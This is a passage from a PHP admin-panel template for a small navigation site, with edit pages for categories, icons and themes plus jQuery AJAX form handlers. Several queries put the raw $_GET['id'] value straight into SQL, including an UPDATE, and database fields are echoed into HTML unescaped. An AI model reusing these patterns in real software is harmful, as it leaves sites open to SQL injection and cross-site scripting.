                 ?>











                                        </tbody>
                                    </table>

                                </div>
                            </div>
                        </div>

                    </div>

                </div>

        </main>

        <?php } else if($do=="edit-project"){
if(!isset($_GET['id'])){
$url = "/admin"; 
echo "<meta http-equiv='refresh' content ='1;url=$url'>";
exit;
 
} 

$id=$_GET['id'];
        $sql = "SELECT * FROM zyyo_project WHERE id='$id'";
        $result = DB::get_row($sql);

               $type1=($result["type"]==0)?"checked":"";
              $type2=($result["type"]==0)?"":"checked";
                
               

               
            
       
                 

?>
        <!--页面主要内容-->
        <main class="lyear-layout-content">

            <div class="container-fluid">

                <div class="row">

                    <div class="col-lg-12">
                        <div class="card">
                            <header class="card-header">
                                <div class="card-title">分类编辑</div>
                            </header>
                            <div class="card-body">



                                <form action="" method="post" name="edit-form" class="edit-project-form edit-form">
                                    <div class="tab-content">
                                        <div class="tab-pane fade show active" id="config"
                                            aria-labelledby="basic-config">
                                            <div style="display:none" class="mb-3">

                                                <input class="form-control" type="text" id="id" name="id"
                                                    value="<?= $id?>" placeholder="请输入">

                                            </div>

                                            <div class="mb-3">
                                                <label for="sitename" class="form-label">分类名称</label>
                                                <input class="form-control" type="text" id="name" name="name"
                                                    value="<?= $result["name"]?>" placeholder="请输入">

                                            </div>


                                            <div class="mb-3">
                                                <label for="icon" class="form-label">图标</label>
                                                <textarea class="form-control" id="icon" rows="5" name="icon"
                                                    placeholder="请输入"><?=$result["icon"]?></textarea>
                                            </div>
                                            <div class="mb-3">
                                                <label for="app_trace" class="form-label">显示类型</label>
                                                <div class="controls-box clearfix">
                                                    <div class="form-check form-check-inline">
                                                        <input type="radio" id="app_trace_1" name="type"
                                                            class="form-check-input" value="0" <?=$type1?>>
                                                        <label class="form-check-label" for="app_trace_1">类型一
                                                        </label>
                                                    </div>
                                                    <div class="form-check form-check-inline">
                                                        <input type="radio" id="app_trace_2" name="type"
                                                            class="form-check-input" value="1" <?=$type2?>>
                                                        <label class="form-check-label" for="app_trace_2">类型二</label>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <div>
                                            <button type="submit" class="btn btn-primary me-1">确 定</button>
                                            <button type="button" class="btn btn-default"
                                                onclick="javascript:history.back(-1);return false;">返 回</button>
                                        </div>

                                    </div>


                            </div>
                            </form>

                        </div>
                    </div>
                </div>

            </div>

    </div>

    </main>
    <!--End 页面主要内容-->



    <?php } else if($do=="icon"){
      
    ?>

    <main class="lyear-layout-content">

        <div class="container-fluid">

            <div class="row">

                <div class="col-lg-12">
                    <div class="card">
                        <header class="card-header">
                            <div class="card-title">图标列表</div>
                        </header>
                        <div class="card-body">
                            <div class="card-search mb-2-5">

                            </div>
                            <div class=" new-icon card-btns mb-2-5">
                                <a class="btn btn-primary me-1" href="#!">
                                    <i class="mdi mdi-plus"></i> 新增
                                </a>


                            </div>
                            <div class="table-responsive">
                                <table class="table table-bordered">
                                    <thead>
                                        <tr>

                                            <th>id</th>
                                            <th>名称</th>

                                            <th>调转链接</th>
                                            <th>点击事件</th>
                                            <th>操作</th>
                                        </tr>
                                    </thead>
                                    <tbody>


                                        <?php 
        
        $sql = "SELECT * FROM zyyo_icon ORDER BY id ";
        $result = DB::query($sql);

        if ($result->num_rows > 0) {
      
            while ($row = $result->fetch_assoc()) {
              
                echo '<tr>
                        
                        <td>';
                echo $row["id"];
                echo '</td>
                        <td>';
               echo $row["tip"];
                 echo '</td>
                        <td>';
             
                        echo $row["href"];
                 echo '</td>
                        <td>';
                        echo $row["onclick"];
               
                 echo '</td>
                        <td><div class="btn-group btn-group-sm">
                            <a class="btn btn-default" href="./index.php?do=edit-icon&id='.$row["id"].'" data-bs-toggle="tooltip" title="编辑"><i class="mdi mdi-pencil"></i></a>
                            <a class="btn btn-default" onclick="del(\'zyyo_icon\', \'' . $row["id"] . '\')" href="#!" data-bs-toggle="tooltip" title="删除"><i class="mdi mdi-window-close"></i></a>
                          </div>
                        </td>
                      </tr>';
            }
        } else {
            echo "没有一个项目";
        }
                 ?>











                                    </tbody>
                                </table>

                            </div>
                        </div>
                    </div>

                </div>

            </div>

    </main>

    <?php } else if($do=="edit-icon"){
if(!isset($_GET['id'])){
$url = "/admin"; 
echo "<meta http-equiv='refresh' content ='1;url=$url'>";
exit;
 
} 

$id=$_GET['id'];
        $sql = "SELECT * FROM zyyo_icon WHERE id='$id'";
        $result = DB::get_row($sql);

            
               
            
       
                 

?>
    <!--页面主要内容-->
    <main class="lyear-layout-content">

        <div class="container-fluid">

            <div class="row">

                <div class="col-lg-12">
                    <div class="card">
                        <header class="card-header">
                            <div class="card-title">分类编辑</div>
                        </header>
                        <div class="card-body">



                            <form action="" method="post" name="edit-form" class="edit-icon-form edit-form">
                                <div class="tab-content">
                                    <div class="tab-pane fade show active" id="config" aria-labelledby="basic-config">
                                        <div style="display:none" class="mb-3">

                                            <input class="form-control" type="text" id="id" name="id" value="<?= $id?>"
                                                placeholder="请输入">

                                        </div>

                                        <div class="mb-3">
                                            <label for="tip" class="form-label">名称</label>
                                            <input class="form-control" type="text" id="tip" name="tip"
                                                value="<?= $result["tip"]?>" placeholder="请输入">

                                        </div>
                                        <div class="mb-3">
                                            <label for="href" class="form-label">点击链接</label>
                                            <input class="form-control" type="text" id="href" name="href"
                                                value="<?= $result["href"]?>" placeholder="请输入">

                                        </div>
                                        <div class="mb-3">
                                            <label for="onclick" class="form-label">点击事件</label>
                                            <input class="form-control" type="text" id="onclick" name="onclick"
                                                value="<?= $result["onclick"]?>" placeholder="请输入(执行js,可为空)">

                                        </div>
                                        <div class="mb-3">
                                            <label for="icon" class="form-label">图标</label>
                                            <textarea class="form-control" id="icon" rows="5" name="icon"
                                                placeholder="请输入"><?=$result["icon"]?></textarea>
                                        </div>

                                        <button type="submit" class="btn btn-primary me-1">确 定</button>
                                        <button type="button" class="btn btn-default"
                                            onclick="javascript:history.back(-1);return false;">返 回</button>
                                    </div>

                                </div>


                        </div>
                        </form>

                    </div>
                </div>
            </div>

        </div>

        </div>

    </main>
    <!--End 页面主要内容-->



    <?php } else if($do=="theme"){
      $theme=$data['theme'];
    if(isset($_GET['id'])){
      $theme=$_GET['id'];
      $sql = "UPDATE zyyo_data SET theme='$theme'  WHERE id=1";
		DB::query($sql);
	
    }
    ?>

    <main class="lyear-layout-content">

        <div class="container-fluid">

            <div class="row">

                <div class="col-lg-12">
                    <div class="card">
                        <header class="card-header">
                            <div class="card-title">主题列表</div>
                        </header>
                        <div class="card-body">
                            <div class="card-search mb-2-5">

                            </div>

                            <div class="table-responsive">
                                <table class="table table-bordered">
                                    <thead>
                                        <tr>

                                            <th>id</th>
                                            <th>名称</th>


                                            <th>操作</th>
                                        </tr>
                                    </thead>
                                    <tbody>


                                        <?php 
        
        $sql = "SELECT * FROM zyyo_theme ORDER BY id ";
        $result = DB::query($sql);

        if ($result->num_rows > 0) {
      
            while ($row = $result->fetch_assoc()) {
              
                echo '<tr>
                        
                        <td>';
                echo $row["id"];
                echo '</td>
                        <td>';
               echo $row["name"];
                 
             
                 $type1=($theme==$row["id"]) ?" 已应用" :"应用";
                      $type2=($theme==$row["id"]) ?  "a" : './index.php?do=theme&id='.$row["id"];
                 echo '</td>
                        <td><div class="btn-group btn-group-sm">
                            <a class="btn btn-default" href="'.$type2.'" data-bs-toggle="tooltip" title="应用">'.$type1.'</a>
                              <a class="btn btn-default" href="./index.php?do=edit-theme&id='.$row["id"].'" data-bs-toggle="tooltip" title="编辑"><i class="mdi mdi-pencil"></i></a>
                            <a class="btn btn-default" href="#!" onclick="del(\'zyyo_theme\', \'' . $row["id"] . '\')" data-bs-toggle="tooltip" title="删除"><i class="mdi mdi-window-close"></i></a>
                          </div>
                        </td>
                      </tr>';
            }
        } else {
            echo "没有一个项目";
        }
                 ?>











                                    </tbody>
                                </table>

                            </div>
                        </div>
                    </div>

                </div>

            </div>

    </main>


    <?php } else if($do=="edit-theme"){
if(!isset($_GET['id'])){
$url = "/admin"; 
echo "<meta http-equiv='refresh' content ='1;url=$url'>";
exit;
 
} 

$id=$_GET['id'];
        $sql = "SELECT * FROM zyyo_theme WHERE id='$id'";
        $result = DB::get_row($sql);

            
               
            
       
                 

?>
    <!--页面主要内容-->
    <main class="lyear-layout-content">

        <div class="container-fluid">

            <div class="row">

                <div class="col-lg-12">
                    <div class="card">
                        <header class="card-header">
                            <div class="card-title">分类编辑</div>
                        </header>
                        <div class="card-body">



                            <form action="" method="post" name="edit-form" class="edit-theme-form edit-form">
                                <div class="tab-content">
                                    <div class="tab-pane fade show active" id="config" aria-labelledby="basic-config">
                                        <div style="display:none" class="mb-3">

                                            <input class="form-control" type="text" id="id" name="id" value="<?= $id?>"
                                                placeholder="请输入">

                                        </div>

                                        <div class="mb-3">
                                            <label for="name" class="form-label">名称</label>
                                            <input class="form-control" type="text" id="name" name="name"
                                                value="<?= $result["name"]?>" placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="main_bg_color" class="form-label">背景</label>
                                            <input class="form-control" type="text" id="main_bg_color"
                                                name="main_bg_color" value="<?= $result["main_bg_color"]?>"
                                            placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="main_text_color" class="form-label">文本颜色</label>
                                            <input class="form-control" type="text" id="main_text_color"
                                                name="main_text_color" value="<?= $result["main_text_color"]?>"
                                            placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="gradient" class="form-label">标题渐变</label>
                                            <input class="form-control" type="text" id="gradient" name="gradient"
                                                value="<?= $result["gradient"]?>" placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="purple_text_color" class="form-label">描述紫色文本</label>
                                            <input class="form-control" type="text" id="purple_text_color"
                                                name="purple_text_color" value="<?= $result["purple_text_color"]?>"
                                            placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="text_bg_color" class="form-label">描述文本背景</label>
                                            <input class="form-control" type="text" id="text_bg_color"
                                                name="text_bg_color" value="<?= $result["text_bg_color"]?>"
                                            placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="item_bg_color" class="form-label">项目颜色</label>
                                            <input class="form-control" type="text" id="item_bg_color"
                                                name="item_bg_color" value="<?= $result["item_bg_color"]?>"
                                            placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="item_hover_color" class="form-label">项目鼠标移入颜色</label>
                                            <input class="form-control" type="text" id="item_hover_color"
                                                name="item_hover_color" value="<?= $result["item_hover_color"]?>"
                                            placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="item_left_title_color" class="form-label">项目标题颜色</label>
                                            <input class="form-control" type="text" id="item_left_title_color"
                                                name="item_left_title_color" value="<?= $result["
                                                item_left_title_color"]?>" placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="item_left_text_color" class="form-label">项目文本颜色</label>
                                            <input class="form-control" type="text" id="item_left_text_color"
                                                name="item_left_text_color" value="<?= $result["
                                                item_left_text_color"]?>" placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="footer_text_color" class="form-label">项底部文本颜色</label>
                                            <input class="form-control" type="text" id="footer_text_color"
                                                name="footer_text_color" value="<?= $result["footer_text_color"]?>"
                                            placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="left_tag_item" class="form-label">标签颜色</label>
                                            <input class="form-control" type="text" id="left_tag_item"
                                                name="left_tag_item" value="<?= $result["left_tag_item"]?>"
                                            placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="card_filter" class="form-label">卡片模糊</label>
                                            <input class="form-control" type="text" id="card_filter" name="card_filter"
                                                value="<?= $result["card_filter"]?>" placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="back_filter" class="form-label">背景模糊</label>
                                            <input class="form-control" type="text" id="back_filter" name="back_filter"
                                                value="<?= $result["back_filter"]?>" placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="back_filter_color" class="form-label">遮罩</label>
                                            <input class="form-control" type="text" id="back_filter_color"
                                                name="back_filter_color" value="<?= $result["back_filter_color"]?>"
                                            placeholder="请输入">
                                        </div>
                                        <div class="mb-3">
                                            <label for="svg_icon_color" class="form-label">svg图标颜色</label>
                                            <input class="form-control" type="text" id="fill" name="fill"
                                                value="<?= $result["fill"]?>" placeholder="请输入">
                                        </div>




                                        <button type="submit" class="btn btn-primary me-1">确 定</button>
                                        <button type="button" class="btn btn-default"
                                            onclick="javascript:history.back(-1);return false;">返 回</button>
                                    </div>

                                </div>


                        </div>
                        </form>

                    </div>
                </div>
            </div>

        </div>

        </div>

    </main>
    <!--End 页面主要内容-->





    <?php } ?>
    </div>
    </div>
    <script type="text/javascript" src="./static/js/jquery.min.js"></script>
    <script type="text/javascript" src="./static/js/popper.min.js"></script>
    <script type="text/javascript" src="./static/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="./static/js/perfect-scrollbar.min.js"></script>
    <script type="text/javascript" src="./static/js/jquery.cookie.min.js"></script>
    <!--引入chart插件js-->
    <script type="text/javascript" src="./static/js/chart.min.js"></script>
    <script type="text/javascript" src="./static/js/main.min.js"></script>

    <!--对话框插件js-->
    <script type="text/javascript" src="./static/js/jquery-confirm/jquery-confirm.min.js"></script>



    <script type="text/javascript" src="./static/js/lyear-loading.js"></script>
    <script type="text/javascript" src="./static/js/bootstrap-notify.min.js"></script>
    <script>
        $('.base-form').on('submit', function (event) {
            if ($(this)[0].checkValidity() === false) {
                event.preventDefault();
                event.stopPropagation();
                $(this).addClass('was-validated');
                return false;
            }

            var $data = $(this).serialize();

            $.ajax({
                url: './api.php',
                method: 'POST',
                data: $data + "&" + "do=base",
                dataType: 'json',
                success: function (res) {
                    if (res.code === 1) {
                        $.notify({
                            message: '修改成功',
                        }, {
                            type: 'success',
                            placement: {
                                from: 'top',
                                align: 'right'
                            },
                            z_index: 10800,
                            delay: 1500,
                            animate: {
                                enter: 'animate__animated animate__fadeInUp',
                                exit: 'animate__animated animate__fadeOutDown'
                            }
                        });

                    } else {
                        $.notify({
                            message: '失败，错误原因：' + res.msg,
                        }, {
                            type: 'danger',
                            placement: {
                                from: 'top',
                                align: 'right'
                            },
                            z_index: 10800,
                            delay: 1500,
                            animate: {
                                enter: 'animate__animated animate__shakeX',
                                exit: 'animate__animated animate__fadeOutDown'
                            }
                        });

                    }
                },
                error: function () {
                    $.notify({
                        message: '服务器错误',
                    }, {
                        type: 'danger',
                        placement: {
                            from: 'top',
                            align: 'right'
                        },
                        z_index: 10800,
                        delay: 1500,
                        animate: {
                            enter: 'animate__animated animate__shakeX',
                            exit: 'animate__animated animate__fadeOutDown'
                        }
                    });
                }
            });

            return false;
        });

        $('.edit-item-form').on('submit', function (event) {
            if ($(this)[0].checkValidity() === false) {
                event.preventDefault();
                event.stopPropagation();
                $(this).addClass('was-validated');
                return false;
            }

            var $data = $(this).serialize();

            $.ajax({
                url: './api.php',
                method: 'POST',
                data: $data + "&" + "do=edititem",
                dataType: 'json',
                success: function (res) {
                    if (res.code === 1) {
                        $.notify({
                            message: '修改成功',
                        }, {
                            type: 'success',
                            placement: {
                                from: 'top',
                                align: 'right'
                            },
                            z_index: 10800,
                            delay: 1500,
                            animate: {
                                enter: 'animate__animated animate__fadeInUp',
                                exit: 'animate__animated animate__fadeOutDown'
                            }
                        });

                    } else {
                        $.notify({
                            message: '失败，错误原因：' + res.msg,
                        }, {
                            type: 'danger',
                            placement: {
                                from: 'top',
                                align: 'right'
                            },
                            z_index: 10800,
                            delay: 1500,
                            animate: {
                                enter: 'animate__animated animate__shakeX',
                                exit: 'animate__animated animate__fadeOutDown'
                            }
                        });

                    }
                },
                error: function () {
                    $.notify({
                        message: '服务器错误',
                    }, {
                        type: 'danger',
                        placement: {
                            from: 'top',
                            align: 'right'
                        },
                        z_index: 10800,
                        delay: 1500,
                        animate: {
                            enter: 'animate__animated animate__shakeX',
                            exit: 'animate__animated animate__fadeOutDown'
                        }
                    });
                }
            });

            return false;
        });
        $('.edit-theme-form').on('submit', function (event) {
            if ($(this)[0].checkValidity() === false) {
                event.preventDefault();
                event.stopPropagation();
                $(this).addClass('was-validated');
                return false;
            }

            var $data = $(this).serialize();

            $.ajax({
                url: './api.php',
                method: 'POST',
                data: $data + "&" + "do=edittheme",
                dataType: 'json',
                success: function (res) {
                    if (res.code === 1) {
                        $.notify({
                            message: '修改成功',
                        }, {
                            type: 'success',
                            placement: {
                                from: 'top',
                                align: 'right'
                            },
                            z_index: 10800,
                            delay: 1500,
                            animate: {
                                enter: 'animate__animated animate__fadeInUp',
                                exit: 'animate__animated animate__fadeOutDown'
                            }
                        });

                    } else {
                        $.notify({
                            message: '失败，错误原因：' + res.msg,
                        }, {
                            type: 'danger',
                            placement: {
                                from: 'top',
                                align: 'right'
                            },
                            z_index: 10800,
                            delay: 1500,
                            animate: {
                                enter: 'animate__animated animate__shakeX',
                                exit: 'animate__animated animate__fadeOutDown'
                            }
                        });

                    }
                },
                error: function () {
                    $.notify({
                        message: '服务器错误',
                    }, {
                        type: 'danger',
                        placement: {
                            from: 'top',
                            align: 'right'
                        },
                        z_index: 10800,
                        delay: 1500,
                        animate: {
                            enter: 'animate__animated animate__shakeX',
                            exit: 'animate__animated animate__fadeOutDown'
                        }
                    });
                }
            });

            return false;
        });
        $('.edit-icon-form').on('submit', function (event) {
            if ($(this)[0].checkValidity() === false) {
                event.preventDefault();
                event.stopPropagation();
                $(this).addClass('was-validated');
                return false;
            }

            var $data = $(this).serialize();

            $.ajax({
                url: './api.php',
                method: 'POST',
                data: $data + "&" + "do=editicon",
                dataType: 'json',
                success: function (res) {
                    if (res.code === 1) {
                        $.notify({
                            message: '修改成功',
                        }, {
                            type: 'success',
                            placement: {
                                from: 'top',
                                align: 'right'
                            },
                            z_index: 10800,
                            delay: 1500,
                            animate: {
                                enter: 'animate__animated animate__fadeInUp',
                                exit: 'animate__animated animate__fadeOutDown'
                            }
                        });

                    } else {
                        $.notify({
                            message: '失败，错误原因：' + res.msg,
                        }, {
                            type: 'danger',
                            placement: {
                                from: 'top',
                                align: 'right'
                            },
                            z_index: 10800,
                            delay: 1500,
                            animate: {
                                enter: 'animate__animated animate__shakeX',
                                exit: 'animate__animated animate__fadeOutDown'
                            }
                        });

                    }
                },
                error: function () {
                    $.notify({
                        message: '服务器错误',
                    }, {
                        type: 'danger',
                        placement: {
                            from: 'top',
                            align: 'right'
                        },
                        z_index: 10800,
                        delay: 1500,
                        animate: {
                            enter: 'animate__animated animate__shakeX',
                            exit: 'animate__animated animate__fadeOutDown'
                        }
                    });
                }
            });

            return false;
        });
        $('.edit-project-form').on('submit', function (event) {
            if ($(this)[0].checkValidity() === false) {
                event.preventDefault();
                event.stopPropagation();
                $(this).addClass('was-validated');
                return false;
            }

            var $data = $(this).serialize();

            $.ajax({
                url: './api.php',
                method: 'POST',
                data: $data + "&" + "do=editproject",
                dataType: 'json',
                success: function (res) {
                    if (res.code === 1) {
                        $.notify({
                            message: '修改成功',
                        }, {
                            type: 'success',
                            placement: {
                                from: 'top',
                                align: 'right'
                            },
                            z_index: 10800,
                            delay: 1500,
                            animate: {
                                enter: 'animate__animated animate__fadeInUp',
                                exit: 'animate__animated animate__fadeOutDown'
                            }
                        });

                    } else {
                        $.notify({
                            message: '失败，错误原因：' + res.msg,
                        }, {
                            type: 'danger',
                            placement: {
                                from: 'top',
                                align: 'right'
                            },
                            z_index: 10800,
                            delay: 1500,
                            animate: {
                                enter: 'animate__animated animate__shakeX',
                                exit: 'animate__animated animate__fadeOutDown'
                            }
                        });

                    }
                },
                error: function () {
                    $.notify({
                        message: '服务器错误',
                    }, {
                        type: 'danger',
                        placement: {
                            from: 'top',
                            align: 'right'
                        },
                        z_index: 10800,
                        delay: 1500,
                        animate: {
                            enter: 'animate__animated animate__shakeX',
                            exit: 'animate__animated animate__fadeOutDown'
                        }
                    });
                }
            });

            return false;
        });

        $('.new-project').on('click', function () {
            $.confirm({
                title: '添加分类',
                content: '<div class="form-group p-1 mb-0">' +
                    '  <label class="control-label">名称</label>' +
                    '  <input autofocus="" type="text" id="input-name" placeholder="请输入您的名字" class="form-control">' +
                    '  <label class="control-label">图标</label>' +
                    '  <input autofocus="" type="text" id="input-icon" placeholder="请输入您的字体图标(可不填)" class="form-control">' +
                    '<div class="mb-3"><label for="app_trace" class="form-label">显示类型</label><div class="controls-box clearfix"><div class="form-check form-check-inline"><input type="radio" id="app_trace_1" name="type" class="form-check-input" value="0" checked=""><label class="form-check-label" for="app_trace_1">类型一</label></div><div class="form-check form-check-inline"><input type="radio" id="app_trace_2" name="type" class="form-check-input" value="1"><label class="form-check-label" for="app_trace_2">类型二</label></div></div></div>' +
                    '</div>',
                buttons: {
                    sayMyName: {
                        text: '添加',
                        btnClass: 'btn-orange',
                        action: function () {
                            var input1 = this.$content.find('input#input-name');
                            var input2 = this.$content.find('input#input-icon');
                            var type = this.$content.find('input[name="type"]:checked').val();
                            var errorText = this.$content.find('.text-danger');
                            if (!$.trim(input1.val())) {
                                $.alert({
                                    content: "不能为空。",
                                    type: 'red'
                                });
                                return false;
                            } else {
                                $.ajax({
                                    url: './api.php',
                                    method: 'POST',
                                    data: {
                                        do: 'newproject',
                                        name: input1.val(),
                                        icon: input2.val(),
                                        type: type
                                    },
                                    dataType: 'json',
                                    success: function (res) {
                                        if (res.code === 1) {
                                            $.notify({
                                                message: '修改成功',
                                            }, {
                                                type: 'success',
                                                placement: {
                                                    from: 'top',
                                                    align: 'right'
                                                },
                                                z_index: 10800,
                                                delay: 1500,
                                                animate: {
                                                    enter: 'animate__animated animate__fadeInUp',
                                                    exit: 'animate__animated animate__fadeOutDown'
                                                }
                                            });
                                            setTimeout(function () {
                                                location.href = 'index.php?do=project';
                                            }, 500);
                                        } else {
                                            $.notify({
                                                message: '失败，错误原因：' + res.msg,
                                            }, {
                                                type: 'danger',
                                                placement: {
                                                    from: 'top',
                                                    align: 'right'
                                                },
                                                z_index: 10800,
                                                delay: 1500,
                                                animate: {
                                                    enter: 'animate__animated animate__shakeX',
                                                    exit: 'animate__animated animate__fadeOutDown'
                                                }
                                            });
                                        }
                                    },
                                    error: function () {
                                        $.notify({
                                            message: '服务器错误',
                                        }, {
                                            type: 'danger',
                                            placement: {
                                                from: 'top',
                                                align: 'right'
                                            },
                                            z_index: 10800,
                                            delay: 1500,
                                            animate: {
                                                enter: 'animate__animated animate__shakeX',
                                                exit: 'animate__animated animate__fadeOutDown'
                                            }
                                        });
                                    }
                                });
                            }
                        }
                    },
                    '取消': function () { }
                }
            });
        });






        $('.new-item').on('click', function () {
            $.confirm({
                title: '添加分类',
                content: '<div class="form-group p-1 mb-0">' +
                    '  <label class="control-label">名称</label>' +
                    '  <input autofocus="" type="text" id="input-name" placeholder="请输入您的名字" class="form-control">' +
                    '  <label class="control-label">图标</label>' +
                    '  <input autofocus="" type="text" id="input-icon" placeholder="请输入您的链接图标(必填)" class="form-control">' +
                    '  <label class="control-label">描述</label>' +
                    '  <input autofocus="" type="text" id="input-des" placeholder="请输入您的描述" class="form-control">'
                    +
                    '  <label class="control-label">链接</label>' +
                    '  <input autofocus="" type="text" id="input-href" placeholder="请输入您的链接" class="form-control">' +
                    '<?php
			            
			$sql = "SELECT * FROM zyyo_project ORDER BY id ";
                $result = DB:: query($sql);
			
			        if($result-> num_rows > 0) {
			      echo '<div class="mb-3"><label for="app_trace" class="form-label">显示分类</label><div class="controls-box clearfix">';
                while ($row = $result -> fetch_assoc()) {
			              echo ' <div class="form-check form-check-inline"><input type="radio" id="app_trace_1" name="project" class="form-check-input" value="';
			                echo $row["id"];
			                echo '" checked="">';
			                echo '<label class="form-check-label" for="app_trace_1">';
			                echo $row["name"];
			                 
			                echo '</label></div>';
                }
			           echo '</label></div></div>';
            } else {
			            echo "没有一个项目";
            }?> ',
            buttons: {
                sayMyName: {
                    text: '添加',
                        btnClass: 'btn-orange',
                            action: function () {
                                var input1 = this.$content.find('input#input-name');
                                var input2 = this.$content.find('input#input-icon');
                                var input3 = this.$content.find('input#input-des');
                                var input4 = this.$content.find('input#input-href');

                                var project = this.$content.find('input[name="project"]:checked').val();
                                var errorText = this.$content.find('.text-danger');
                                if (!$.trim(input1.val()) || !$.trim(input2.val()) || !$.trim(input3.val()) || !$.trim(input4.val())) {
                                    $.alert({
                                        content: "不能为空。",
                                        type: 'red'
                                    });
                                    return false;
                                } else if (!$.trim(project)) {

                                    $.alert({
                                        content: "请先添加一个分类。",
                                        type: 'red'
                                    });
                                    return false;

                                } {
                                    $.ajax({
                                        url: './api.php',
                                        method: 'POST',
                                        data: {
                                            do: 'newitem',
                                            name: input1.val(),
                                            icon: input2.val(),
                                            des: input3.val(),
                                            href: input4.val(),
                                            project: project
                                        },
                                        dataType: 'json',
                                        success: function (res) {
                                            if (res.code === 1) {
                                                $.notify({
                                                    message: '修改成功',
                                                }, {
                                                    type: 'success',
                                                    placement: {
                                                        from: 'top',
                                                        align: 'right'
                                                    },
                                                    z_index: 10800,
                                                    delay: 1500,
                                                    animate: {
                                                        enter: 'animate__animated animate__fadeInUp',
                                                        exit: 'animate__animated animate__fadeOutDown'
                                                    }
                                                });
                                                setTimeout(function () {
                                                    location.href = 'index.php?do=item';
                                                }, 500);
                                            } else {
                                                $.notify({
                                                    message: '失败，错误原因：' + res.msg,
                                                }, {
                                                    type: 'danger',
                                                    placement: {
                                                        from: 'top',
                                                        align: 'right'
                                                    },
                                                    z_index: 10800,
                                                    delay: 1500,
                                                    animate: {
                                                        enter: 'animate__animated animate__shakeX',
                                                        exit: 'animate__animated animate__fadeOutDown'
                                                    }
                                                });
                                            }
                                        },
                                        error: function () {
                                            $.notify({
                                                message: '服务器错误',
                                            }, {
                                                type: 'danger',
                                                placement: {
                                                    from: 'top',
                                                    align: 'right'
                                                },
                                                z_index: 10800,
                                                delay: 1500,
                                                animate: {
                                                    enter: 'animate__animated animate__shakeX',
                                                    exit: 'animate__animated animate__fadeOutDown'
                                                }
                                            });
                                        }
                                    });
                                }
                            }
                },
                '取消': function () { }
            }
        });
			});






        $('.new-icon').on('click', function () {
            $.confirm({
                title: '添加图标',
                content: '<div class="form-group p-1 mb-0">' +
                    '  <label class="control-label">名称</label>' +
                    '  <input autofocus="" type="text" id="input-name" placeholder="请输入您的名字" class="form-control">' +
                    '  <label class="control-label">图标</label>' +
                    '  <input autofocus="" type="text" id="input-icon" placeholder="请输入您的字体图标" class="form-control">' +
                    '  <label class="control-label">跳转链接</label>' +
                    '  <input autofocus="" type="text" id="input-href" placeholder="请输入您的链接" class="form-control">'
                    +
                    '  <label class="control-label">onclick</label>' +
                    '  <input autofocus="" type="text" id="input-onclick" placeholder="请输入您的点击事件(默认不填)" class="form-control">',
                buttons: {
                    sayMyName: {
                        text: '添加',
                        btnClass: 'btn-orange',
                        action: function () {
                            var input1 = this.$content.find('input#input-name');
                            var input2 = this.$content.find('input#input-icon');
                            var input3 = this.$content.find('input#input-href');
                            var input4 = this.$content.find('input#input-onclick');


                            if (!$.trim(input1.val()) || !$.trim(input2.val()) || !$.trim(input3.val())) {
                                $.alert({
                                    content: "不能为空。",
                                    type: 'red'
                                });
                                return false;
                            } else {
                                $.ajax({
                                    url: './api.php',
                                    method: 'POST',
                                    data: {
                                        do: 'newicon',
                                        name: input1.val(),
                                        icon: input2.val(),
                                        href: input3.val(),
                                        onclick: input4.val()
                                    },
                                    dataType: 'json',
                                    success: function (res) {
                                        if (res.code === 1) {
                                            $.notify({
                                                message: '修改成功',
                                            }, {
                                                type: 'success',
                                                placement: {
                                                    from: 'top',
                                                    align: 'right'
                                                },
                                                z_index: 10800,
                                                delay: 1500,
                                                animate: {
                                                    enter: 'animate__animated animate__fadeInUp',
                                                    exit: 'animate__animated animate__fadeOutDown'
                                                }
                                            });
                                            setTimeout(function () {
                                                location.href = 'index.php?do=icon';
                                            }, 500);
                                        } else {
                                            $.notify({
                                                message: '失败，错误原因：' + res.msg,
                                            }, {
                                                type: 'danger',
                                                placement: {
                                                    from: 'top',
                                                    align: 'right'
                                                },
                                                z_index: 10800,
                                                delay: 1500,
                                                animate: {
                                                    enter: 'animate__animated animate__shakeX',
                                                    exit: 'animate__animated animate__fadeOutDown'
                                                }
                                            });
                                        }
                                    },
                                    error: function () {
                                        $.notify({
                                            message: '服务器错误',
                                        }, {
                                            type: 'danger',
                                            placement: {
                                                from: 'top',
                                                align: 'right'
                                            },
                                            z_index: 10800,
                                            delay: 1500,
                                            animate: {
                                                enter: 'animate__animated animate__shakeX',
                                                exit: 'animate__animated animate__fadeOutDown'
                                            }
                                        });
                                    }
                                });
                            }
                        }
                    },
                    '取消': function () { }
                }
            });
        });





        function del(c, id) {
            $.confirm({
                title: '提示',
                content: '确认都删了?',
                icon: 'mdi mdi-comment-question',
                animation: 'scale',
                closeAnimation: 'scale',
                opacity: 0.5,
                buttons: {
                    'confirm': {
                        text: '继续',
                        btnClass: 'btn-blue',
                        action: function () {
                            $.ajax({
                                url: './api.php',
                                method: 'POST',
                                data: {
                                    do: 'del',
                                    c: c,
                                    id: id
                                },
                                dataType: 'json',
                                success: function (res) {
                                    if (res.code === 1) {
                                        $.notify({
                                            message: '删除成功~',
                                        }, {
                                            type: 'success',
                                            placement: {
                                                from: 'top',
                                                align: 'right'
                                            },
                                            z_index: 10800,
                                            delay: 1500,
                                            animate: {
                                                enter: 'animate__animated animate__fadeInUp',
                                                exit: 'animate__animated animate__fadeOutDown'
                                            }
                                        });
                                        setTimeout(function () {
                                            location.href = '';
                                        }, 1500);
                                    } else {
                                        $.notify({
                                            message: '失败，错误原因：' + res.msg,
                                        }, {
                                            type: 'danger',
                                            placement: {
                                                from: 'top',
                                                align: 'right'
                                            },
                                            z_index: 10800,
                                            delay: 1500,
